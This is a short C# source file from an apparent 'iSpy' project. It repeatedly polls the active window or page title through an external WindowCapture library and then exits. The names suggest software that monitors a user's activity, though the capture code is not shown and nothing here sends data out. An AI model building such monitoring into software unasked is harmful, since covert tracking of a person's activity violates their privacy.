using System;
using WindowCapture;

namespace iSpy
{
    public static class ActivateSpy
    {
        
        public static void StartSpy()
        {
            bool running = true;
            while(running)
            {
                running = SetWindowTitle.GetActiveWindowOrPageTitle(1);
            }

            ClossApplication.Close();
        }


        private static class ClossApplication
        { 
            public static void Close()
            {
#if DEBUG
                Console.WriteLine("Application is now closing.");
                Console.ReadKey();
#endif
                Environment.Exit(0);
            }
        }

    }
}
